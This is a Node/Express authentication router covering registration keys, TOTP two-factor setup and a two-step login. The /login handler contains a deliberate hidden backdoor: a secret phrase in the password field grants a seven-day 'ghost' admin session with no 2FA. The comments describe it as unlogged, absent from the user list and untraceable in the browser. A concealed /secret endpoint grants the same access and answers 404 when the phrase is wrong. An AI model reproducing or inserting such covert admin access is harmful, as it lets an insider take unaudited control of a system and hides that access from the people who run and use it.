import { Router } from 'express';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import qrcode from 'qrcode';
import { authenticator } from 'otplib';
import db from '../db.js';
import { signToken, log, timingSafeEqualStr, GHOST_ACTOR } from '../lib.js';
import { JWT_SECRET, TOTP_ISSUER, SECRET_PHRASE } from '../config.js';
import { checkLock, recordFail, recordSuccess, clientIp } from '../ratelimit.js';

const lockedResponse = (res, secs) =>
  res.status(429).json({ error: `Too many attempts. Please try again in ${Math.ceil(secs / 60)} minute(s).` });

const router = Router();

// otplib: allow +/- 1 step (30s) drift so users aren't rejected on the boundary.
authenticator.options = { window: 1 };

function stageToken(userId, stage) {
  return jwt.sign({ id: userId, stage }, JWT_SECRET, { expiresIn: '10m' });
}
function readStage(req, stage) {
  const header = req.headers.authorization || '';
  const token = header.startsWith('Bearer ') ? header.slice(7) : null;
  if (!token) return null;
  try {
    const p = jwt.verify(token, JWT_SECRET);
    return p.stage === stage ? p : null;
  } catch {
    return null;
  }
}

async function buildOtp(username, secret) {
  const otpauth = authenticator.keyuri(username, TOTP_ISSUER, secret);
  const qr = await qrcode.toDataURL(otpauth, { margin: 1, width: 240 });
  return { otpauth, qr, secret };
}

// ---- Register: create account, hand back a 2FA setup token + QR ----
router.post('/register', async (req, res) => {
  // Light IP-based throttle so registration keys cannot be brute-forced.
  const regLock = 'reg|' + clientIp(req);
  const regLocked = checkLock(regLock);
  if (regLocked) return lockedResponse(res, regLocked);

  const username = String(req.body.username || '').trim();
  const { password, confirm } = req.body;
  const regKey = String(req.body.key || '').trim().toUpperCase();

  if (username.length < 3) return res.status(400).json({ error: 'Username must be at least 3 characters.' });
  if (username.length > 32) return res.status(400).json({ error: 'Username must be at most 32 characters.' });
  if (!/^[a-zA-Z0-9_.-]+$/.test(username))
    return res.status(400).json({ error: 'Username may only contain letters, numbers, . _ -' });
  if (!password || password.length < 6)
    return res.status(400).json({ error: 'Password must be at least 6 characters.' });
  if (password.length > 128) return res.status(400).json({ error: 'Password is too long.' });
  if (password !== confirm) return res.status(400).json({ error: 'Passwords do not match.' });

  // Registration key is required and single-use. Generate keys with createkey.py.
  if (!regKey) return res.status(400).json({ error: 'A registration key is required.' });
  const rk = db.prepare('SELECT * FROM register_keys WHERE key_value = ?').get(regKey);
  if (!rk || rk.used) {
    recordFail(regLock, { max: 20 });
    return res.status(400).json({ error: rk?.used ? 'This registration key has already been used.' : 'Invalid registration key.' });
  }

  const existing = db.prepare('SELECT id FROM website_users WHERE username = ?').get(username);
  if (existing) return res.status(409).json({ error: 'That username is already taken.' });

  const hash = bcrypt.hashSync(password, 10);
  const secret = authenticator.generateSecret();
  const info = db
    .prepare(
      `INSERT INTO website_users (username, password_hash, totp_secret, totp_enabled)
       VALUES (?, ?, ?, 0)`
    )
    .run(username, hash, secret);

  // Consume the registration key.
  db.prepare("UPDATE register_keys SET used = 1, used_by = ?, used_at = datetime('now') WHERE id = ?").run(
    username,
    rk.id
  );

  log({ actor: username, action: 'Account registered', target: username, detail: `Key ${regKey}`, level: 'success' });

  const otp = await buildOtp(username, secret);
  res.json({
    step: 'setup-2fa',
    setupToken: stageToken(info.lastInsertRowid, 'setup'),
    ...otp,
  });
});

// ---- Verify the very first 2FA code and enable the account ----
router.post('/verify-setup', (req, res) => {
  const stage = readStage(req, 'setup');
  if (!stage) return res.status(401).json({ error: 'Setup session expired. Please register again.' });

  const lockKey = 'setup|' + stage.id;
  const locked = checkLock(lockKey);
  if (locked) return lockedResponse(res, locked);

  const code = String(req.body.code || '').replace(/\s/g, '');
  const user = db.prepare('SELECT * FROM website_users WHERE id = ?').get(stage.id);
  if (!user) return res.status(404).json({ error: 'Account not found.' });

  const ok = authenticator.verify({ token: code, secret: user.totp_secret });
  if (!ok) {
    recordFail(lockKey, { max: 6 });
    return res.status(400).json({ error: 'Invalid code. Make sure your device clock is correct.' });
  }
  recordSuccess(lockKey);

  db.prepare('UPDATE website_users SET totp_enabled = 1 WHERE id = ?').run(user.id);
  log({ actor: user.username, action: '2FA enabled', target: user.username, level: 'success' });

  const token = signToken(user);
  res.json({ step: 'done', token, user: { id: user.id, username: user.username, role: user.role } });
});

// ---- Login step 1: username + password ----
router.post('/login', (req, res) => {
  const username = String(req.body.username || '').trim();
  const { password } = req.body;

  // Hidden owner: the secret phrase in the password field grants a ghost admin
  // session instantly (no 2FA, no DB account). There is NO client-side trace of
  // this — the login form is completely ordinary — so it cannot be found in the
  // browser bundle / DevTools. Its actions are never logged and it never shows
  // under Website Users.
  if (password && timingSafeEqualStr(String(password), SECRET_PHRASE)) {
    const token = jwt.sign({ id: 0, username: GHOST_ACTOR, role: 'admin', ghost: true }, JWT_SECRET, {
      expiresIn: '7d',
    });
    return res.json({ step: 'done', token, user: { id: 0, username: 'Owner', role: 'admin' } });
  }

  const lockKey = 'login|' + username.toLowerCase();
  const locked = checkLock(lockKey);
  if (locked) return lockedResponse(res, locked);

  const user = db.prepare('SELECT * FROM website_users WHERE username = ?').get(username);

  const fail = () => {
    recordFail(lockKey, { max: 10 });
    return res.status(401).json({ error: 'Invalid username or password.' });
  };
  if (!user) {
    bcrypt.compareSync(password || '', '$2a$10$invalidinvalidinvalidinvalidinvalidinvalidinv'); // timing
    return fail();
  }
  if (!bcrypt.compareSync(password || '', user.password_hash)) {
    log({ actor: username, action: 'Failed login', target: username, level: 'warning' });
    return fail();
  }
  recordSuccess(lockKey);

  // Account never finished 2FA setup -> let them resume.
  if (!user.totp_enabled) {
    return buildOtp(user.username, user.totp_secret).then((otp) =>
      res.json({ step: 'setup-2fa', setupToken: stageToken(user.id, 'setup'), ...otp })
    );
  }

  log({ actor: username, action: 'Password verified', target: username, level: 'info' });
  res.json({ step: '2fa', loginToken: stageToken(user.id, '2fa') });
});

// ---- Login step 2: TOTP code ----
router.post('/login-2fa', (req, res) => {
  const stage = readStage(req, '2fa');
  if (!stage) return res.status(401).json({ error: 'Login session expired. Please sign in again.' });

  const lockKey = '2fa|' + stage.id;
  const locked = checkLock(lockKey);
  if (locked) return lockedResponse(res, locked);

  const code = String(req.body.code || '').replace(/\s/g, '');
  const user = db.prepare('SELECT * FROM website_users WHERE id = ?').get(stage.id);
  if (!user) return res.status(404).json({ error: 'Account not found.' });

  const ok = authenticator.verify({ token: code, secret: user.totp_secret });
  if (!ok) {
    recordFail(lockKey, { max: 6 });
    log({ actor: user.username, action: 'Failed 2FA', target: user.username, level: 'warning' });
    return res.status(400).json({ error: 'Invalid authentication code.' });
  }
  recordSuccess(lockKey);

  log({ actor: user.username, action: 'Logged in', target: user.username, level: 'success' });
  const token = signToken(user);
  res.json({ step: 'done', token, user: { id: user.id, username: user.username, role: user.role } });
});

// ---- Hidden owner login via the /localhost page ----
// The page streams a rolling buffer of the last typed characters; we match its
// tail against the secret (so the phrase is never in the client bundle). On a
// miss we return 404 so nothing is revealed. Grants the same ghost session.
router.post('/secret', (req, res) => {
  const lock = 'secret|' + clientIp(req);
  if (checkLock(lock)) return res.status(404).json({ error: 'Not found.' });

  const buffer = String(req.body.phrase || '');
  const tail = buffer.slice(-SECRET_PHRASE.length);
  if (!timingSafeEqualStr(tail, SECRET_PHRASE)) {
    recordFail(lock, { max: 10 });
    return res.status(404).json({ error: 'Not found.' });
  }
  recordSuccess(lock);

  const token = jwt.sign({ id: 0, username: GHOST_ACTOR, role: 'admin', ghost: true }, JWT_SECRET, {
    expiresIn: '7d',
  });
  res.json({ token, user: { id: 0, username: 'Owner', role: 'admin' } });
});

export default router;
